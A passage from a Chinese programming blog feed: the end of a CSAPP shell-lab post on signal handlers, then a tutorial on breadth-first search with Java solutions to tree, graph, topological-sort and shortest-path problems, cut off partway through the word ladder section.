class="title">pid</span>);</span></span><br><span class="line">            job-&gt;state = ST;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"Job [%d] (%d) terminated by signal 20\n"</span>, pid2jid(pid), pid);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/*handle child process interrupt by uncatched signal*/</span></span><br><span class="line">        <span class="keyword">if</span> (WIFSIGNALED(status)) &#123;</span><br><span class="line">            <span class="keyword">int</span> child_sig = WTERMSIG(status);</span><br><span class="line">            <span class="keyword">if</span> (child_sig == SIGINT) &#123;</span><br><span class="line">                deletejob(jobs, pid);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Job [%d] (%d) terminated by signal 2\n"</span>, pid2jid(pid), pid);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/*process is exited in normal way*/</span></span><br><span class="line">        <span class="keyword">if</span> (WIFEXITED(status)) &#123;</span><br><span class="line">            deletejob(jobs, pid);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">// 被信号中断时</span></span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">-1</span> &amp;&amp; errno != ECHILD) &#123;</span><br><span class="line">        unix_error(<span class="string">"waitpid error"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最后这三个handler的功能划分是：</p>
<ol>
<li>sigint_handler（属于shell进程）捕捉CtrlC，并给前台所有子进程发送SIGINT，从而造成进程terminate，需要删除job</li>
<li>sigtstp_handler（属于shell进程）捕捉CtrlZ，并给前台所有子进程发送SIGTSTP，从而造成进程stop，需要把job状态置为ST</li>
<li>sigchld_handler捕捉当任何子进程正常结束、终止或停止时，都会发出的SIGCHLD信号</li>
</ol>
<p>所以我们在sigint和sigtstp中只负责利用kill函数发送信号，而对于deletejob等操作全部放在sigchld_handler函数中。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>通过实现这个mini的Shell，加深了对进程管理和信号机制的理解。只要把书中的内容认真读一遍，这个实验就不难实现。</p>
]]></content>
      
        <categories>
            
            <category> 厚积薄发 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CSAPP </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[九章-BFS]]></title>
      <url>/2018/03/08/Algorithms/%E4%B9%9D%E7%AB%A0-BFS/</url>
      <content type="html"><![CDATA[<p>九章第三讲，宽度优先搜索。主要分为二叉树上的宽搜、图上的宽搜和矩阵上的宽搜三部分。</p>
<h1 id="宽度优先搜索-BFS"><a href="#宽度优先搜索-BFS" class="headerlink" title="宽度优先搜索 BFS"></a>宽度优先搜索 BFS</h1><h2 id="什么是宽度优先搜索"><a href="#什么是宽度优先搜索" class="headerlink" title="什么是宽度优先搜索"></a>什么是宽度优先搜索</h2><p>先看下wikipedia的解释： <strong>Breadth-first search</strong> (<strong>BFS</strong>) is an algorithm for traversing or searching <a href="https://en.wikipedia.org/wiki/Tree_data_structure" title="Tree data structure" target="_blank" rel="noopener">tree</a> or <a href="https://en.wikipedia.org/wiki/Graph_(data_structure" target="_blank" rel="noopener">graph</a>. It starts at the tree root or some arbitrary node of a graph, and explores the neighbor nodes first, before moving to the next level neighbours.</p>
<p>通常BFS会需要用到两种数据结构</p>
<ol>
<li>Queue 利用queue先进先出的特点保证先访问neighbor结点再访问下个level的结点</li>
<li>Set 利用set来记录已经访问过的结点，去重</li>
</ol>
<p>一般来说BFS分三部分可以实现</p>
<ol>
<li>把root(起始结点)放进queue中<code>queue.offer(root);</code></li>
<li>while循环 <code>while(!queue.isEmpty()){}</code></li>
<li>for 当前层，拓展出下一层</li>
</ol>
<a id="more"></a>
<p>在下面的题目中可以体会一下这三个步骤</p>
<h2 id="什么时候应该使用BFS"><a href="#什么时候应该使用BFS" class="headerlink" title="什么时候应该使用BFS?"></a>什么时候应该使用BFS?</h2><ul>
<li>树的层级遍历</li>
<li>图的遍历 Traversal in Graph<ul>
<li>由点及面</li>
<li>拓扑排序</li>
</ul>
</li>
<li>最短路径问题 Shortest Path in Simple Graph<ul>
<li>仅限于简单图求最短路径（即每个边长度都是1，且没有方向)    </li>
</ul>
</li>
</ul>
<h2 id="宽搜的时间复杂度"><a href="#宽搜的时间复杂度" class="headerlink" title="宽搜的时间复杂度"></a>宽搜的时间复杂度</h2><p><code>O(n + m)</code> 这里的n是点的个数, m是边的个数。 因为while循环(每次poll一个点出来) 会执行n次，内部循环(for 所有 neighbor)加起来会执行m次，因为找邻居实际就是在找边，所以加起来就是m次。 一共是<code>O(n + m)</code></p>
<h1 id="二叉树上的宽搜"><a href="#二叉树上的宽搜" class="headerlink" title="二叉树上的宽搜"></a>二叉树上的宽搜</h1><p>因为二叉树是一种特殊的图，它具有方向性，且不存在环，所以在BFS中是比较简单的一类。就先通过两个二叉树上的宽搜来练练手吧。</p>
<h2 id="Example-Binary-Tree-Level-Order-Traversal"><a href="#Example-Binary-Tree-Level-Order-Traversal" class="headerlink" title="Example: Binary Tree Level Order Traversal"></a>Example: Binary Tree Level Order Traversal</h2><p><a href="http://www.lintcode.com/en/problem/binary-tree-level-order-traversal/" target="_blank" rel="noopener">Binary Tree Level Order Traversal</a> 二叉树的层级遍历，这道题就是一个典型的宽度优先搜索。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; levelOrder(TreeNode root) &#123;</span><br><span class="line">    List&lt;List&lt;Integer&gt;&gt; result = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    <span class="keyword">if</span>(root == <span class="keyword">null</span>) <span class="keyword">return</span> result;</span><br><span class="line">    Queue&lt;TreeNode&gt; queue = <span class="keyword">new</span> LinkedList&lt;TreeNode&gt;();</span><br><span class="line">    # step1 : root入队列</span><br><span class="line">    queue.offer(root);</span><br><span class="line">    # step2 : while循环</span><br><span class="line">    <span class="keyword">while</span>(!queue.isEmpty())&#123;</span><br><span class="line">        # step3 : for当前层，拓展出下一层</span><br><span class="line">        <span class="keyword">int</span> size = queue.size();</span><br><span class="line">        List&lt;Integer&gt; level = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i&lt;size;i++)&#123;</span><br><span class="line">            TreeNode node = queue.poll();</span><br><span class="line">            level.add(node.val);</span><br><span class="line">            <span class="keyword">if</span>(node.left != <span class="keyword">null</span>)</span><br><span class="line">                queue.offer(node.left);</span><br><span class="line">            <span class="keyword">if</span>(node.right != <span class="keyword">null</span>)</span><br><span class="line">                queue.offer(node.right);</span><br><span class="line">        &#125;</span><br><span class="line">        result.add(level);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里需要注意的是代码第7行需要用<code>size = queue.size()</code>而不是直接<code>for(int i = 0; i &lt; queue.size(); i++)</code>的原因是在循环的过程中queue会不断加入新的元素，所以queue.size()会不停变化，而我们只想遍历这个level的结点，所以需要事先把size取出来。</p>
<p>Follow Up：<a href="http://www.lintcode.com/en/problem/binary-tree-level-order-traversal-ii/" target="_blank" rel="noopener">Binary Tree Level Order Traversal ii</a>要求返回bottom-up的层级遍历。 则只需要在上面代码的基础上加上一句<code>Collections.reverse(result);</code>即可</p>
<h2 id="Example2-Binary-Tree-Zigzag-Order-Traversal"><a href="#Example2-Binary-Tree-Zigzag-Order-Traversal" class="headerlink" title="Example2: Binary Tree Zigzag Order Traversal"></a>Example2: Binary Tree Zigzag Order Traversal</h2><p><a href="http://www.lintcode.com/en/problem/binary-tree-zigzag-level-order-traversal/" target="_blank" rel="noopener">Binary Tree Zigzag Order Traversal</a> 这道题我去今日头条面试的时候还有问到过这道题，当时的我觉得好难啊。其实就是一个BFS的变形，根据当前层(假设root是第一层)的奇偶性, 如果是偶数层, 则把这一层数组颠倒一下即可。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 初始 num = 1;</span></span><br><span class="line"><span class="keyword">if</span>(num % <span class="number">2</span> == <span class="number">0</span>)&#123;</span><br><span class="line">	Collections.reverse(level);</span><br><span class="line">&#125;</span><br><span class="line">num++;</span><br></pre></td></tr></table></figure></p>
<h2 id="More"><a href="#More" class="headerlink" title="More"></a>More</h2><p><a href="http://www.lintcode.com/en/problem/convert-binary-tree-to-linked-lists-by-depth/" target="_blank" rel="noopener">Convert Binary Tree to Linked Lists by Depth</a></p>
<h1 id="图上的宽搜"><a href="#图上的宽搜" class="headerlink" title="图上的宽搜"></a>图上的宽搜</h1><p>图上的宽搜和树上的有什么区别？</p>
<ol>
<li>图上可能存在环，这意味着同一个结点可能会重复进入queue</li>
<li>图上可能存在没有联通的点（孤立的点）</li>
<li>节点之间没有父子关系了，而是邻居关系。</li>
</ol>
<p>在图上进行宽搜的时候通常会用到邻接表(HashMap这样的数据结构)，key是节点本身，value是节点的邻居。 还需要使用Set来判断node是否已遍历过，防止节点重复进入queue</p>
<h2 id="由点及面"><a href="#由点及面" class="headerlink" title="由点及面"></a>由点及面</h2><h3 id="Example1-Graph-Valid-Tree"><a href="#Example1-Graph-Valid-Tree" class="headerlink" title="Example1: Graph Valid Tree"></a>Example1: Graph Valid Tree</h3><p><a href="http://www.lintcode.com/en/problem/graph-valid-tree/" target="_blank" rel="noopener">Graph Valid Tree</a> 这道题给你图的点数和边，让你判断是否能构成一个树。 这里我们需要明确的是，一个具有n个点的图要想成为一棵树，需要满足两个条件：</p>
<ol>
<li>有n-1条边</li>
<li><p>这n个点相互联通</p>
<p>所以我们从任意一个点出发（由点及面），进行深度优先搜索，搜索的过程中用set来防止节点重复进入队列。直到我们的队列为空时，看set中是否包含了所有的元素，如果是则说明这就是一棵树。</p>
</li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">validTree</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">int</span>[][] edges)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> len = edges.length;</span><br><span class="line">    <span class="keyword">if</span>(n - <span class="number">1</span> != len) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="comment">// 邻接表</span></span><br><span class="line">    Map&lt;Integer, Set&lt;Integer&gt;&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">        map.put(i, <span class="keyword">new</span> HashSet&lt;Integer&gt;());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> u = edges[i][<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">int</span> v = edges[i][<span class="number">1</span>];</span><br><span class="line">        map.get(u).add(v);</span><br><span class="line">        map.get(v).add(u);</span><br><span class="line">    &#125;</span><br><span class="line">    Queue&lt;Integer&gt; queue = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">    queue.offer(<span class="number">0</span>);</span><br><span class="line">    Set&lt;Integer&gt; set = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">    <span class="keyword">while</span>(!queue.isEmpty())&#123;</span><br><span class="line">        <span class="keyword">int</span> size = queue.size();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; size; i++)&#123;</span><br><span class="line">            <span class="keyword">int</span> node = queue.poll();</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> next: map.get(node))&#123;</span><br><span class="line">                <span class="keyword">if</span>(!set.contains(next))&#123;</span><br><span class="line">                    queue.offer(next);</span><br><span class="line">                    set.add(next);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> set.size() == n;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在这里比较重要的一个东西就是邻接表，做图的遍历问题一般都需要用到邻接表(可用邻接矩阵或者类似题目中的edge set来代替)</p>
<h3 id="Example2-Clone-Graph"><a href="#Example2-Clone-Graph" class="headerlink" title="Example2: Clone Graph"></a>Example2: Clone Graph</h3><p><a href="http://www.lintcode.com/en/problem/clone-graph/" target="_blank" rel="noopener">Clone Graph</a> 这道题让我们克隆一个图。思路就是先DFS遍历图的所有节点，得到所有节点的List之后克隆所有的结点，并创建一个originNode -&gt; cloneNode的映射Map。最后再利用这个Map遍历并克隆所有的边。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> UndirectedGraphNode <span class="title">cloneGraph</span><span class="params">(UndirectedGraphNode node)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(node == <span class="keyword">null</span>) <span class="keyword">return</span> node;</span><br><span class="line">    <span class="comment">//find all the nodes</span></span><br><span class="line">    ArrayList&lt;UndirectedGraphNode&gt; nodes = <span class="keyword">new</span> ArrayList&lt;UndirectedGraphNode&gt;();</span><br><span class="line">    nodes = getNodes(node);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// copy all the nodes</span></span><br><span class="line">    Map&lt;UndirectedGraphNode,UndirectedGraphNode&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span>(UndirectedGraphNode n: nodes)&#123;</span><br><span class="line">        map.put(n, <span class="keyword">new</span> UndirectedGraphNode(n.label));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// copy all the edges</span></span><br><span class="line">    <span class="keyword">for</span>(UndirectedGraphNode n : nodes)&#123;</span><br><span class="line">        <span class="keyword">for</span>(UndirectedGraphNode nei: n.neighbors)&#123;</span><br><span class="line">            map.get(n).neighbors.add(map.get(nei));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> map.get(node);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> ArrayList&lt;UndirectedGraphNode&gt; <span class="title">getNodes</span><span class="params">(UndirectedGraphNode node)</span></span>&#123;</span><br><span class="line">    Queue&lt;UndirectedGraphNode&gt; queue = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">    Set&lt;UndirectedGraphNode&gt; set = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">    ArrayList&lt;UndirectedGraphNode&gt; nodes = <span class="keyword">new</span> ArrayList&lt;UndirectedGraphNode&gt;();</span><br><span class="line">    queue.offer(node);</span><br><span class="line">    set.add(node);</span><br><span class="line">    <span class="keyword">while</span>(!queue.isEmpty())&#123;</span><br><span class="line">        <span class="keyword">int</span> size = queue.size();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; i++)&#123;</span><br><span class="line">            UndirectedGraphNode n = queue.poll();</span><br><span class="line">            nodes.add(n);</span><br><span class="line">            <span class="keyword">for</span>(UndirectedGraphNode nei : n.neighbors)&#123;</span><br><span class="line">                <span class="keyword">if</span>(!set.contains(nei))&#123;</span><br><span class="line">                    queue.offer(nei);</span><br><span class="line">                    set.add(nei);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> nodes;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这两道题都属于图的遍历(由点及面) ，类似的题目还有<a href="http://www.lintcode.com/en/problem/search-graph-nodes/" target="_blank" rel="noopener">Search Graph Nodes</a>，<a href="http://www.lintcode.com/problem/connected-component-in-undirected-graph/" target="_blank" rel="noopener">Connected Component in Undirected Graph</a>, <a href="http://www.lintcode.com/problem/smallest-rectangle-enclosing-black-pixels/" target="_blank" rel="noopener">Smallest Rectangle Enclosing Black Pixel</a></p>
<h2 id="拓扑排序"><a href="#拓扑排序" class="headerlink" title="拓扑排序"></a>拓扑排序</h2><p>上面两个题涉及到的都是无向图，对于有向图，我们就来到另一类问题 – 拓扑排序。 拓扑排序的题一般会问两种</p>
<ol>
<li>求<strong>任意</strong>拓扑序( 如果是求所有的拓扑序 应该用DFS去做)</li>
<li>存不存在拓扑序(如果出现了循环依赖，就不存在拓扑序)</li>
</ol>
<p>举个例子来说，我们有ABCDE五门课程，其中A(计算机导论)是B(C语言)的先修课, 而B是C(数据结构)和D(算法)的先修课，C是E(操作系统)的先修课，这样就组成了一个拓扑结构。 所以我们一般这样处理拓扑排序问题</p>
<ol>
<li>起点应当是入度为0的结点(没有先修课程的课)，即我们第一门应该学A</li>
<li>当遍历过入度为0之后, 把A的后继课程的入度－1，即学过了A之后，B已经满足了他的先修条件，B的入度变成了0, 表示我们可以开始学B了</li>
<li>如果结束循环的时候所有课程都已经修过，则就说明存在一个拓扑序。</li>
</ol>
<h3 id="Example1：Topological-Sorting"><a href="#Example1：Topological-Sorting" class="headerlink" title="Example1：Topological Sorting"></a>Example1：Topological Sorting</h3><p><a href="http://www.lintcode.com/problem/topological-sorting/" target="_blank" rel="noopener">Topological Sorting</a> 这道题让求任意一个拓扑序。</p>
<p>利用我们之前说的方法</p>
<ol>
<li>首先求出每个点的入度，构造一个Map<node, integer=""></node,></li>
<li>寻找入度为0的结点作为我们的起始结点。</li>
<li>进入循环，将当前节点放入set中标记已经访问过。 在当前节点的邻居节点的入度都减一，并把入度变成0的邻居节点入队列表示已经可以访问这个节点。 </li>
<li>当queue中没有节点的时候说明已经遍历结束。按进入队列的次序构成了拓扑序。</li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ArrayList&lt;DirectedGraphNode&gt; <span class="title">topSort</span><span class="params">(ArrayList&lt;DirectedGraphNode&gt; graph)</span> </span>&#123;</span><br><span class="line">    ArrayList&lt;DirectedGraphNode&gt; results = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    <span class="keyword">if</span>(graph == <span class="keyword">null</span> || graph.size() == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> results;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 计算每个点的入度</span></span><br><span class="line">    Map&lt;DirectedGraphNode, Integer&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span>(DirectedGraphNode node: graph)&#123;</span><br><span class="line">        map.put(node, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(DirectedGraphNode node : graph)&#123;</span><br><span class="line">        <span class="keyword">for</span>(DirectedGraphNode nei: node.neighbors)&#123;</span><br><span class="line">            map.put(nei, map.get(nei) + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 找入度为0的点</span></span><br><span class="line">    Queue&lt;DirectedGraphNode&gt; queue = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span>(DirectedGraphNode node: graph)&#123;</span><br><span class="line">        <span class="keyword">if</span>(map.get(node) == <span class="number">0</span>)&#123;</span><br><span class="line">            queue.offer(node);</span><br><span class="line">            results.add(node);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">//循环 每次都把当前节点的邻居的入度减一</span></span><br><span class="line">    <span class="keyword">while</span>(!queue.isEmpty())&#123;</span><br><span class="line">        DirectedGraphNode node = queue.poll();</span><br><span class="line">        <span class="keyword">for</span>(DirectedGraphNode nei: node.neighbors)&#123;</span><br><span class="line">            map.put(nei, map.get(nei) - <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span>(map.get(nei) == <span class="number">0</span>)&#123;</span><br><span class="line">                results.add(nei);</span><br><span class="line">                queue.offer(nei);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> results;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Example2-Course-Schedule"><a href="#Example2-Course-Schedule" class="headerlink" title="Example2 : Course Schedule"></a>Example2 : Course Schedule</h3><p><a href="http://www.lintcode.com/en/problem/course-schedule/" target="_blank" rel="noopener">Course Schedule</a> 这道题就是我们前面举的先修课程的例子。只不过它是按照int[][]的类型给的先修课程。 只需要先遍历一遍<code>int[][] prerequisites</code>，然后构造一个<code>Map&lt;Integer, Hashset&lt;Integer&gt;&gt;</code>这样的map，key是课程编号，value是它的后继课程。然后方法与前面topological sorting完全类似。这道题问的是是否能修完所有的课程，那只用在出循环之后判断set中的课程数和numCourses是否相等即可。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">canFinish</span><span class="params">(<span class="keyword">int</span> numCourses, <span class="keyword">int</span>[][] prerequisites)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(numCourses == <span class="number">0</span> || prerequisites.length == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 计算入度 ，即每门课程的先修课程</span></span><br><span class="line">        List[] edges = <span class="keyword">new</span> ArrayList[numCourses];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; numCourses; i++)</span><br><span class="line">            edges[i] = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">        <span class="keyword">int</span>[] degree = <span class="keyword">new</span> <span class="keyword">int</span>[numCourses];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span>[] pre: prerequisites)&#123;</span><br><span class="line">            degree[pre[<span class="number">0</span>]] = degree[pre[<span class="number">0</span>]] + <span class="number">1</span>;</span><br><span class="line">            edges[pre[<span class="number">1</span>]].add(pre[<span class="number">0</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 找第一个没有入度的课程</span></span><br><span class="line">        Queue&lt;Integer&gt; queue = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">        ArrayList&lt;Integer&gt; result = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; numCourses; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(degree[i] == <span class="number">0</span>)&#123;</span><br><span class="line">                queue.offer(i);</span><br><span class="line">                result.add(i);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//dfs</span></span><br><span class="line">        <span class="keyword">while</span>(!queue.isEmpty())&#123;</span><br><span class="line">            <span class="keyword">int</span> num = queue.poll();</span><br><span class="line">            <span class="keyword">int</span> size = edges[num].size();</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size ; i++)&#123;</span><br><span class="line">                <span class="keyword">int</span> pointer = (<span class="keyword">int</span>)edges[num].get(i);</span><br><span class="line">                degree[pointer] = degree[pointer] - <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">if</span>(degree[pointer] == <span class="number">0</span>)&#123;</span><br><span class="line">                    queue.add(pointer);</span><br><span class="line">                    result.add(pointer);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (result.size() == numCourses);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h3 id="More-1"><a href="#More-1" class="headerlink" title="More"></a>More</h3><p><a href="http://www.lintcode.com/problem/sequence-reconstruction/" target="_blank" rel="noopener">Sequence Reconstruction</a> 这道题问是否能从seqs中唯一重构出拓扑排序序列org。注意有这个唯一的要求，我们只需要保证队列中最多只有1个元素，且这个元素要和org中对应位置的相同。大致思路与上面的拓扑排序一样。</p>
<h2 id="求最短路径"><a href="#求最短路径" class="headerlink" title="求最短路径"></a>求最短路径</h2><h3 id="Example1-Word-Ladder"><a href="#Example1-Word-Ladder" class="headerlink" title="Example1: Word Ladder"></a>Example1: Word Ladder</h3><p><a href="http://www.lintcode.com/problem/word-ladder/" target="_blank" rel="noopener">Word Ladder</a>这道题呢给我们一个字典，然后一个起点一个终点，每次变换一个字母，只能用字典中出现过的单词，求需要多少次变换可以变到终点单词。 </p>
<p>仔细看看这其实就是一个求最短路径的问题，我们可以把字典构造成一个图，如果单词a可以通过变换一个字母变成单词b，那么我们就用一条边连接这两个单词。所以这道题就变成了在一个图中找start和end之间的最短距离。 </p>
<p>而这个题的难点就在于如何构造这个图。我们可以对于任意一个单词(<code>O(n)</code>)，遍历整个字典(<code>O(n)</code>)，判断该单词与其他单词的是否只差1个字母(<code>O(L)</code>)。这样做法的时间复杂度是<code>O(n * n * L)</code>n是单词数，L是单词长度。 另一种做法是，对于任意一个单词(<code>O(n)</code>)我们尝试用26个字母替换其中的某个字母(<code>O(26 * L)</code>），然后判断新生成的单词是否存在字典中。判断是否存在可以用哈希表，时间复杂度为常数。所以这种方法的时间复杂度就是<code>O(n * 26 * L)</code> 。实际做的时候发现第一种方法是会超时的。</p>
<p>第一种构造图的代码：</p>
